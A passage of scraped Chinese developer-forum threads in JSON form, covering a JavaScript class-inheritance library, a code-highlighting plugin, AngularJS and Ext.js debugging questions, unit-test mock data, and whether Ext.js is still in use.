class=\"mi\">2</span><span class=\"p\">);</span> <span class=\"c1\">// =&gt; run a, b: 1 2</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">(</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">);</span> <span class=\"c1\">// =&gt; [4,5,6]</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">(</span><span class=\"mi\">7</span><span class=\"p\">,</span><span class=\"mi\">8</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">);</span> <span class=\"c1\">// =&gt; [7,8,9,0,1,2,3]</span>\n</pre></div>\n\n<h3>5. classmethod( method_name, function )</h3>\n\n<p>定义类方法，类方法不会被子类继承，也不能重载。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">classmethod</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 类方法</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'class method run'</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt; class method run</span>\n</pre></div>\n\n<h3>6. extend( class_name )</h3>\n\n<p>继承出新类。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">);</span>\n\n<span class=\"c1\">// 下面两种写法是等价的</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassB'</span><span class=\"p\">,</span> <span class=\"nx\">ClassB</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'ClassB'</span><span class=\"p\">);</span>\n</pre></div>\n\n<h3>7. alias( alias_name , method_name )</h3>\n\n<p>给方法取别名</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 普通方法</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">alias</span><span class=\"p\">(</span><span class=\"s1\">'aliasRun'</span><span class=\"p\">,</span> <span class=\"s1\">'run'</span><span class=\"p\">);</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nx\">ClassA</span><span class=\"p\">();</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt; run</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">aliasRun</span><span class=\"p\">();</span> <span class=\"c1\">// =&gt; run</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span> <span class=\"o\">===</span> <span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">aliasRun</span><span class=\"p\">;</span> <span class=\"c1\">// =&gt; true</span>\n</pre></div>\n\n<h3>8. uper( method_name )</h3>\n\n<p>调用父类方法</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">ClassA</span> <span class=\"o\">=</span> <span class=\"nx\">Class</span><span class=\"p\">(</span><span class=\"s1\">'ClassA'</span><span class=\"p\">,</span> <span class=\"nb\">Object</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"c1\">// 普通方法</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ClassA run'</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">ClassB</span> <span class=\"o\">=</span> <span class=\"nx\">ClassA</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'ClassB'</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"nx\">ClassB</span><span class=\"p\">.</span><span class=\"nx\">uper</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">).</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">arguments</span><span class=\"p\">);</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ClassB run'</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">ClassC</span> <span class=\"o\">=</span> <span class=\"nx\">ClassB</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">(</span><span class=\"s1\">'ClassC'</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n        <span class=\"nx\">ClassC</span><span class=\"p\">.</span><span class=\"nx\">uper</span><span class=\"p\">(</span><span class=\"s1\">'run'</span><span class=\"p\">).</span><span class=\"nx\">apply</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">arguments</span><span class=\"p\">);</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'ClassC run'</span><span class=\"p\">);</span>\n    <span class=\"p\">});</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">c</span> <span class=\"o\">=</span> <span class=\"nx\">ClassC</span><span class=\"p\">();</span>\n<span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">run</span><span class=\"p\">();</span>\n<span class=\"c1\">// =&gt; ClassA run</span>\n<span class=\"c1\">// =&gt; ClassB run</span>\n<span class=\"c1\">// =&gt; ClassC run</span>\n</pre></div>\n</div></div>"], "reply": "61", "tittle": "还在纠结 JavaScript 的继承？给你们看看什么是黑科技", "comment": ["嘿嘿 在这也能碰见你", "啦啦啦， lz 又放黑魔法啦๛ก(ｰ̀ωｰ́ก)", " 不然咧～", " 我的黑科技从来都是很逆天的", "很厉害的样子，确实不错。", "这科技 黑在哪里ǖ", "只看了第一个 demo\r", "lz 是用 js 实现了单继承和方法重载？", "`(function(a,b){}).length`?", " \r", "\r", "/w\\ 其实代码里面用了很多黑科技的", " 必须不错~ /w\\", "然而 ES6 已经有 class 和 extend 了……以及更加干净的新语法", " 恩， es6 的 class 很惊艳，不过 @", " 还有一些更新的特性，比如根据参数长度重载…… 当然，还是要说，函数式语言好，模板匹配才是王道 （ 逃", "黑在哪里…", " \r", "\r", "1 ，没好看也没好用多少。\r", "2 ，不能把类打开添加新方法。\r", "3 ，不能重载。\r", "4 ，没有配套的工具，比如最简单的，假设父类对我是一个黑箱，我需要调用父类的方法怎么办？\r", "5 ，其实我的这个才更符合人们对基于类继承的面向对象的认知。\r", "6 ，如果 JavaScript 要好好做成基于原型的面向对象语言，那么参考 Io lang ，我也没必要折腾这些了。", " JS 在大杂烩这条路上越走越远了", "黑科技 @!!!", " js 下的方法重载……还不够黑", " \r", "\r", "是的，单继承和方法重载。\r", "\r", "继承出来的对象能够用 instanceof 检验类型", " 对的 /w\\ 是这样玩的", " es6 可重载，而且对于我来说，看起来和其它语言里面的类声明更相近也更容易理解。\r", "父类是个黑箱…… 这本来就是面向对象的思路吧，不关心黑箱，当然，要是有个逗逼写了个类太难用，只好 hack 回去就没法说了。\r", "es6 目前支持度着急，浏览器上自己实现类的确按照你这样有很多便利。", "流弊", " 我的目的一向是到哪里都能用 /w\\。", "这个确实给力！", " \r", "\r", "1 ，没好看也没好用多少。 \r", "从 stage 0 开始看起. import 反正我已经吐槽过了。但是 class 绝对是一个好帮手。\r", "\r", "2 ，不能把类打开添加新方法。\r", "prototype 还是可以访问的。也可以用子类的方式扩展。还有 es7 的 decorators 草稿标准。\r", " \r", " \r", "3 ，不能重载。 \r", "可以\r", "\r", "4 ，没有配套的工具，比如最简单的，假设父类对我是一个黑箱，我需要调用父类的方法怎么办？\r", "if(super.fn){super.fn()}\r", "\r", "5 ，其实我的这个才更符合人们对基于类继承的面向对象的认知。 \r", "有争议\r", "\r", "6 ，如果 JavaScript 要好好做成基于原型的面向对象语言，那么参考 Io lang ，我也没必要折腾这些了。\r", "我觉得是一个方向性错误。", "\r", "\r", "上面是用 stage 0 的标准模仿楼主写的简单的方法。逻辑上可能有副作用，只是证明可行性。\r", "\r", "上面实际执行的结果如下：\r", "1\r", "print all {}\r", "print all { '0': 1, '1': 2, '2': 3 }\r", "[Function: fn2]\r", "fn2, print from base\r", "fn2 from Class A", " 2 3 4 均不成立……原因同 @", " \r", "\r", "1 总归是比现有的不修改语法的其他方法好看些  5 6 他们（ TC 39 ）志不在此 支持度有 transpiler 帮手……", " 拜大神", "mark", " \r", "\r", "那还不如造新语言来的靠谱……真的……", " \r", "\r", "支持度欠佳， chrome 上面还硬性要求 strict mode", " \r", "\r", "志不在此那最好，把基于类继承的面向对象忘的干干净净，老老实实看看别人 Io lang 基于原型链继承多正常。\r", "\r", "现在这个大杂烩搞得乱七八糟的，还一堆不兼容问题。好歹我这个扔那里都能用", "提醒楼主，函数的 name 属性是个只读属性，所以设置也没用，有的浏览器还会抛异常。", " \r", "\r", "以前留的坑，忘了改了", " \r", "第一次接触这种写法，学到了，非常感谢。", " \r", "这只是一个简单的 demo ，特性上我觉得没有什么，只是觉得语法上你的这种写法很啰嗦而已，部分实现的话新特性也可以支持，比如上面 fn 重复定义的问题，使用我的那个方法也可以简单的解决掉。上面的案例已经修改了。\r", "\r", "\r", "同时尝试了自定义 class ，估计有点麻烦，但是也不是不可行。 overloadClass 可以支持拿到 class function 本身。\r", "\r", "至于所谓的支持度，在有 transpiler 的情况下我向来不关心，我关心的是前端工程化，编码高效化以及问题定位速度。就像习惯了 coffee 或者 om 之后你让我再回去写 es5 的 js ，我是断然不乐意的。我的研究也只要能在 V8 里面跑就 OK 。\r", "\r", "\r", "\r", " \r", "\r", "我也是第一次尝试用这个特性来做，因为工程化的话这种灵活性可能会是一种麻烦。当然既然用了 stage 0 干脆连`::`的写法也一起尝试用了。不过楼主的特性还不能完全支持，不知道混用两种方法能不能达到完全处理。", "少用继承...", "好像很黑科技的样子，比 Typescript 的 Overload 强大，可人家是故意不让用 :)", "对于 lz 这种闲的蛋疼的人我只想说...\r", "\r", "\r", "已粉...", " 世界上只有两种语言，没人用的和被人骂的。。。论语言设计， 随便路边拦一个谁都能完爆 js ，又何苦拿它开刀。正是因为用的人太多，才不好丢掉历史包袱啊。\r", "\r", "另外你用 transpiler 能有多少兼容性问题，转译出来的代码也就跟人手写这种类的差不多。。。", "JavaScript 适用的场景用一般的几种模式的继承已经够了。如果放在一些 scale 比较大的场景会有很多意想不到的后果。", " \r", "\r", "也是哈 /w\\， 就是我比较喜欢造轮子", " \r", "\r", "比如捏？什么意想不到的后果？", " \r", "\r", "/w\\ 好吧……", " \r", "\r", "面向对象语言我不用继承用什么？\r", "\r", "难道有 typeclass 给我用嘛……", "好东西，但是很少用继承。", "看了 xxxScript 源码, 炒鸡反感~没想到 LZ 还拿出说~", "还是觉得 Blackscript 法比较好，就是阮一峰提到的所谓 Minimalist Approach …\r", "\r", "\r", "不得不说.method 有点太丑了。\r", "脑补一个语法的话…\r", "\r", "\r", "大致想了一下可以用 get:function()和 set:function()一类的诸多黑魔法实现…", " \r", "\r", "丑是丑，但是用起来还算顺手。如果要更简洁的语法的话，只能改语言语法本身了。", " \r", "\r", "嗯，等你造一个更好用的我就用你的。 OwO", "一般吧。这个多态判断不麻烦。\r", "比较难的设计是访问权限 publish private, 和 优雅的 super 的设计 用 apply 的方式却是可用而且实用，但是太丑了了", " \r", "\r", "其实重点不是难不难，判断麻不麻烦，而是好像没什么人想到……", " 什么没有人想到啊。老早就有了。只是你没有发现而已...", "请参考 John Resig 大神 08 年的作品   ", "项目描述是“ JavaScript 的面对对象库”", "以前到热衷鼓捣这些东西， class 实现过这些，还有 mixin ， attribute ， aop 的功能，不过现在看来，除非整套体系都是自己造的，现在意义没这么大，这个时代已经不是基础工具造轮子的时代了，语言层面的标准化在是重要的，比如之前的 yui 3 的 base ， widget 都很强大，但现在已经不维护了。", "这么久了，我还是不知道“面相对象”是个什么。。。", "黑科技黑在哪里……实现了啥独有的功能？根据参数长度重载？随便 Google 一下 JavaScript overloading ，上来就有 John Resig 的这篇：\r", "\r", " 你自己看看时间吧……\r", "\r", "再搜下会发现也有根据参数类型重载的。\r", "\r", "还有你给的这些示例代码，命名一会儿全小写，一会儿下划线分隔，一会儿驼峰。还有调用父类方法的那个 `uper` 我猜是 `upper` 拼错了吧，但其实应该是 `super`。", " \r", "\r", "首先命名规范你喷个毛线？类 开头大写驼峰， 方法开头小写驼峰， 变量小写下划线这个有槽点我没看出来那里有槽点？\r", "\r", "其次，我自己什么都没看就实现了跟 John Resig 一样的东西，那你的意思是不是我跟 John Resig 大神一个水平啊？那你有资格喷个毛？\r", "\r", "我造一个玩具碍着你事了？无语", " \r", "\r", "看这个大神的作品对我没有任何提高……", " 在 IDE 里面，万物皆可打点，然后出一大堆东西。。。", " 这点喷就受不了了，真的是好可爱。你怎么不反驳一下 uper 是什么啊。"]},
{"content": ["<div class=\"topic_content\"><p>这个是我去年写的一个练手项目，当时打算写一个正则表达式的测试引擎，需要用高亮来显示表达式的各个部分，于是新开一个代码高亮插件的项目： code-lighter （ <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/icymorn/code-lighter\">https://github.com/icymorn/code-lighter</a> ）。</p>\n\n<p>当前有很多的小项目是使用正则来提取代码中的 token 的，这样做是比较简单一点；不过我打算从代码解析开始，一点点解析并判断高亮内容，这样的速度也更加快，同时也做了很多容错，因为要高亮的代码语法不一定对，但是我也需要能把其它部分正确高亮。</p>\n\n<p>由于之前编译原理并没有很好掌握，词法分析磕磕绊绊写了好久，支持的语言也有限。不过也算是当时自己的突破了。</p>\n\n<p>目前自带两种主题，一种是 monokai ，一种是 adobe bracket 的高亮。</p>\n\n<p>这是示例页面： <a target=\"_blank\" rel=\"nofollow\" href=\"http://icymorn.github.io/code-lighter/\">http://icymorn.github.io/code-lighter/</a></p>\n\n<p><img src=\"https://raw.githubusercontent.com/icymorn/code-lighter/master/preview.png\" alt=\"alt tag\"></p>\n\n<p>用法如下：</p>\n<div class=\"highlight\"><pre><span class=\"nt\">&lt;pre&gt;</span>\n<span class=\"nt\">&lt;div</span> <span class=\"na\">id=</span><span class=\"s\">'js'</span><span class=\"nt\">&gt;</span>\n    // comment line\n    function bar(){\n        var foo = 'hello';\n        var number = 5 * 6 / 20;\n        return foo;\n    }\n<span class=\"nt\">&lt;/div&gt;</span>\n<span class=\"nt\">&lt;/pre&gt;</span>\n</pre></div>\n\n<p>然后运行：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"nx\">lighter</span><span class=\"p\">.</span><span class=\"nx\">code</span><span class=\"p\">({</span>\n    <span class=\"nx\">target</span><span class=\"o\">:</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">'js'</span><span class=\"p\">),</span>\n    <span class=\"nx\">language</span><span class=\"o\">:</span><span class=\"s1\">'javascript'</span>\n<span class=\"p\">});</span>\n<span class=\"nx\">code</span><span class=\"p\">.</span><span class=\"nx\">on</span><span class=\"p\">();</span> <span class=\"c1\">// 高亮</span>\n<span class=\"nx\">code</span><span class=\"p\">.</span><span class=\"nx\">off</span><span class=\"p\">();</span> <span class=\"c1\">// 取消高亮</span>\n</pre></div>\n\n<p>于是就完成了，通过传入 lineNumber: false 可以取消行号， theme: ‘ dark ’ or 'light' 切换主题。</p>\n\n<p>当然，现在的高亮还不够完善，当时能力有限，又忙着毕业的事情，后来也没有再持续更新。</p>\n\n<p>ps ：现在在写一个基于 js 的函数式语言，等我写差不多了再来分享。</p>\n</div>"], "reply": "9", "tittle": "写了个代码高亮插件，支持 html， css， js", "comment": ["支持~", " 感谢支持", "资瓷", " 这个和我现在做的解析比，简直弱爆了哈哈哈", "做这个东西要懂得编译原理吗？语句的解析？", "字词", " \r", "\r", "/w\\ 相比我们现在做的解析，这个当然弱爆了", " \r", "\r", "恩，要识别出语言中的关键字、操作符、注释、标识符、标点、数字、字面量，并加上不同高亮。使用正则的话，计算量会很大，并且很容易在一些特殊结构的代码中产生错误的高亮。这时候，写个递归下降解析还是很有必要的。", "不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚才一位高中同学（女生）找我帮忙，说想批量下载一个网站上的图片。她有一串关键字，需要依次把它们输入到网站的搜索框，然后点击搜索结果上的「下载」按钮。我上去看了一下，发现那个下载按钮在网页代码里是这么写的：</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/5US8a7R.jpg\">http://i.imgur.com/5US8a7R.jpg</a></p>\n\n<p>查了一下， ng-click 貌似是 AngularJS 里的，意思是点击后会执行引号里面的表达式。但这个表达式是说执行 quickDownload 这个函数吗？可是我在 Console 里输入函数名，提示：</p>\n\n<blockquote>\n<p>Uncaught ReferenceError: quickDownload is not defined</p>\n</blockquote>\n\n<p>自己才疏学浅经验匮乏，不知这种定位函数的方法是否有问题？见笑了，希望大家指点一下啊。非常感谢~</p>\n</div></div>"], "reply": "7", "tittle": "想查看点击后调用的 JS 函数，但是在 Chrome 控制台里找不到该函数", "comment": ["当前$scope 里才行。", "可以给 click 事件打断点", "看看控制台有没有 angular\r", "\r", "angular.element($0).scope()  里面应该能找到 quickDownload", "你应该把完整的需求贴出来。有这功夫脚本都写完了", "chrome 下载 AngularJS Batarang 插件之后才方便调试 angular", "在 controller 里面的$scope.xxxx = function(){}", "ctlr+shift+F  搜索那几个参数名称"]},
{"content": ["<div class=\"topic_content\">1. 你 mock data 跟 test 有没有放在不同文件？\r<br>2. 怎么保证 server 更新的时候 mock data 随之更新？\r<br>3. 你用 sinon 吗？</div>"], "reply": "4", "tittle": "你是怎么组织和管理前端 Unit Test 的 Mock Data 的", "comment": ["这几天正被这个事情烦着。\r", "由于 code coupled 太严重，写一个 UT 要 mock 好几个东西，比如 jquery promise 等 还有一些其他第三方的。\r", "关于 server response ，我采用的是不管不顾，只要 url 被叫到，就算 pass ， response 直接 mock ，假装 server 那边没问题。\r", "用 sinon 的话，感觉又增加了工作内容", "jasmine.spyOn 要被 mock 的方法\r", "\r", "mock data 写在 beforeEach 里面", "好吧，我现在用 superagent 和 superagent-mock ， mock 内容直接写在 spec 里", "不写 mock data ，数据格式不确定。做一个 mock 服务器，增删改请求都返回 200 ，查询的话请求直接转发线上（中间需要添加 token ）服务器，为提高效率让 memcache 做个定时缓存，需要的时候手动清除。\r", "界面的模块与请求模块是绝对独立的，测试时无需请求服务器。\r", "sinon 有些 API 很坑，对的都能测成错的，先进的浏览器可以用 Object.observe 监测对象 MutationObserver 监测 DOM"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有个项目需要在前端用 js 将 js 计算出来画在 canvas 的图像混合 video 的视频作为 stream 发出去，转而搜到 captureStream 这个函数提供差不多的一个思路。然后发现这个函数目前只有 Firefox41 、 42 、 43 内实现了，别的浏览器直接挂……话说有谁有什么替代思路嘛</p>\n</div></div>"], "reply": "2", "tittle": "HTMLCanvasElement.captureStream()有什么替代方法么", "comment": [" ?", "\r", "这个是作为 webM 的解决方案，使用的是 webp 然后压缩。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">Ext</span><span class=\"p\">.</span><span class=\"nx\">Msg</span><span class=\"p\">.</span><span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'Status'</span><span class=\"p\">,</span> <span class=\"s1\">'Changes saved successfully.'</span><span class=\"p\">);</span>\n\n<span class=\"nx\">Ext</span><span class=\"p\">.</span><span class=\"nx\">Msg</span><span class=\"p\">.</span><span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s1\">'Name'</span><span class=\"p\">,</span> <span class=\"s1\">'Please enter your name:'</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">btn</span><span class=\"p\">,</span> <span class=\"nx\">text</span><span class=\"p\">){</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">btn</span> <span class=\"o\">==</span> <span class=\"s1\">'ok'</span><span class=\"p\">){</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">Ext</span><span class=\"p\">.</span><span class=\"nx\">Msg</span><span class=\"p\">.</span><span class=\"nx\">show</span><span class=\"p\">({</span>\n   <span class=\"nx\">title</span><span class=\"o\">:</span><span class=\"s1\">'Save Changes?'</span><span class=\"p\">,</span>\n   <span class=\"nx\">msg</span><span class=\"o\">:</span> <span class=\"s1\">'Your are closing a tab that has unsaved changes. Would you like to save your changes?'</span><span class=\"p\">,</span>\n   <span class=\"nx\">buttons</span><span class=\"o\">:</span> <span class=\"nx\">Ext</span><span class=\"p\">.</span><span class=\"nx\">Msg</span><span class=\"p\">.</span><span class=\"nx\">YESNOCANCEL</span><span class=\"p\">,</span>\n   <span class=\"nx\">fn</span><span class=\"o\">:</span> <span class=\"nx\">processResult</span><span class=\"p\">,</span>\n   <span class=\"nx\">animEl</span><span class=\"o\">:</span> <span class=\"s1\">'elId'</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<p>我想在 chrome 控制台里执行一段脚本，关闭这个对话框，怎么搞？？</p>\n\n<p>追加<br>\n我用 document.getElementById('id').click();可以关了<br>\n但是目标页面只能在 ie6 里面显示，我怎么能找到他的 id ？？</p>\n</div></div>", "<div class=\"topic_content\">谢谢 我用一个 ie6 的 dom 查看器解决了</div>"], "reply": "9", "tittle": "求教 Ext.js 的 messagebox 怎么从外部关闭", "comment": ["Firebug Lite 或是看 Ext.js 源码", "震惊啊=-=   还能看到在用 Extjs 的。 因为我也在。", " 握爪， 而且还是 3.X 版本...", "还有人在用 Ext ，该不会是某不仅仅是世界 500 强公司吧...", "ext 还不错啊，熟了以后开发速度嗷嗷快", "除了上手曲线高，学会以后 确实蛮好玩的。不同的风格。。\r", "EXTJS 6 现在也很灵活了", "配置个 ID 就可以了\r", "然后使用 EXT.GETCOMPMENT （ ID ） 拿到对象", "var yourMessageBox = Ext.ComponentQuery.query('yourIdentifier');\r", "for(var x = yourMessageBox.length; i < 0; i--)\r", "{\r", "// close here\r", "yourMessageBox\r", "\r", "\r", "}", "谢谢 搞定了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这个前端框架是不是现在已经不流行了？？？我用这个做公司的 CRM ，感觉还挺好用的</p>\n</div></div>"], "reply": "30", "tittle": "现在真的没有人用 Ext.Js 了嘛？", "comment": ["很早就不流行了 现在还在用的 基本上都是历史遗留的项目 或者公司内部项目\r", "Ext.JS 授权很贵 估计国内不在乎这个\r", "这个框架做企业 WebApp 确实是比较好用的 尤其是强大的 Grid 和 Layout\r", "但是这个框架实在太重 而且自定义 Customization 起来非常费劲\r", "尤其是现在 HTML5 以及 Responsive Design 流行起来后\r", "这种传统的 仿照 Desktop 效果的框架自然不会再流行\r", "\r", "本来 Sencha Touch 还有点戏的 现在被 ExtJS 6 合并 而且授权费巨高\r", "虽然 GPL 开源 实际上支持的也很差 加上 Backbone Angular React 的流行\r", "已经完全不可能再有原来 ExtJS 3 时代的辉煌了", "群晖还在使用.", "我们之前的项目在用…", "老师前几个月接的私活还在用，因为没接触过，老师还在用，我们也就跟着老师用这个了。\r", "\r", "ps ，有木有大大分享下 ERP 里 Extjs 权限控制的思路。这个快搞死人了。-,-   简洁明了的就是如何让某些用户可以访问某些页面不能操作，然后某些用户可以访问不能操作。", "我觉得 Ext.JS 让人非常尴尬\r", "Ext.JS 貌似上手很快，简单需求看文档 demo 就可以了，但我简单需求用 Ext.JS 干啥？如果是复杂需求呢，就不得不深入 Ext.JS ，而一番费力深入之后呢，你又发现复杂的需求它又实现不了。。。", "企业级 Web App 里用的超多。 Ext.js 项目组件很丰富，感觉除了 Ext.js 根本没有其他框架可以提供那么丰富的封装好的各种控件了… 要说 angular, react ？写个按钮和简单列表还能玩玩，要基本的 Grid View ？ Tree View ？自己找其他的去吧…想 header 可拖动可排序可 resize ？那就更加少之又少了；想全部统一风格统一技术？那就更不可能了…诸如此类…", "  简单啊，每个页面就是一个模块，每个模块的开放需要配置不就行了，一个用户表,一个模块表，一个中间表就行了。", "公司现在用的 2.3 ，感觉配合上 dwr 框架，结构还是挺好用的。", "企业应用里还大把大把的，可能互联网应用上因为求新求快所以用得不多", "我们这某电厂准备上的新系统，要求就是用 extjs 。。。。", "我在用业余中使用", "   那现在前端框架都用什么呢?", "Ext 现在在臃肿，现在流行 foundation/bootstrap+react/angular", " 所有的操作都集合在 grid 里是不正常的设计", "新公司在用，学了一下感觉好费劲，不过，项目已在用 react + node 替换", "阿里云后台就是 extjs 啊", "一直在用.... \r", "6 的扁平化和响应式 感觉不输其他 JS", "非常难用，不过非常强大，无所不包。不过 Angular.js + Bootstrap 更适合大部分需求", "难用的一逼。。。 用它相当于学另一门语言了。", " 扁平化 6 还 OK 但是还不够彻底\r", "响应式就是十分勉强了 勉强可以实现\r", "MVVM 也是生搬硬套 勉强可以算是 MVVM 但是离真正的 MVVM 还是差别很大\r", "\r", "  ExtJS 的问题在于 虽然很丰富 很强大\r", "但是他们的公司急着想要赚钱 一次又一次的坑开发者 尤其是小团队和个人开发者\r", "估计是因为他们觉得这些不赚钱\r", "而且为了赚钱和绑架已有大客户 他们学习以前的 M$ 建立了一个非常封闭的开发生态系统\r", "这样和互联网的开源 开放 相违背\r", "你用了 ExtJS 为你提供现成的 UI 组件\r", "你就要用它的 Class 系统 等等\r", "用了 Class 系统 就得用它提供的工具 否则非常困难\r", "要用工具 那就要交钱 而且交钱必须是 5 份以上的团队许可证\r", "你想用它们的一部分 加上其他框架或者工具 及其困难\r", "\r", "相反 现在流行的框架 都相对比较轻量级\r", "而且往往可以相互结合使用 互相补充\r", "非常重要的就是可替换性 而这个正是 Sencha 不希望看到的\r", "\r", "所以我觉得 这个框架确实比较成熟 但是支持的公司不是很靠谱\r", "一个只能慢慢完善 支持现有企业系统 但是没有很大未来的东西\r", "\r", "等 Web Component ／ ES6+ 成熟之后 估计就没 ExtJS 什么事情了\r", "除非 Sencha 痛改前非 从新做一个新的 开放的 框架或者 UI 组件库\r", "不过目前看来 是不可能的了", "实习公司在用 ExtJS3 ，所以也学了。有桌面 gui 编程基础上手很快。学过 MFC 、 Swing 、 tkinter 、 qt ，再加上一点点函数式基础，表示 so easy", "  其实也不是不正常 因为现有存在 而且他们用惯了\r", "\r", "在其他人（非开发人员）眼里看来 企业软件 其实就是一堆自动的 Excel 文件\r", "所以要求 企业 WebApp 里面的 Grid 要和 Excel 一样强大好用 比如：\r", "Header 拖动 Resize 排序 Filtering 这些都是基本的\r", "行列样式 Fomula 公式 有效值根据上下文和后端数据校验 是一定要有的\r", "还要加上 Inline Editing ，批量操作，导入导出，行、列、多单元 选择／复制／粘贴\r", "更过分的是还有根据所在行列的上下文环境 自动计算 和 自动完成\r", "\r", "不要以为我瞎编 这些都是我在做企业 WebApp 的 Grid 的时候 我们产品提出来的需求\r", "作为开发者 就知道在 Web 上想要全部做到这些是不可能的 但是用户不会这么认为的\r", "绝对会抱怨说难用 这些不都是 Excel 现成的 为什么你们开发不出来\r", "还没有 Excel 好用 用你们开发的系统干嘛 然后就都回去继续用 Excel 了\r", "项目取消 XD", "南山医院在用", "阿里云，百度云，新浪云的管理后台都是 boostrap+jquery 京东商城的 erp 也是。\r", 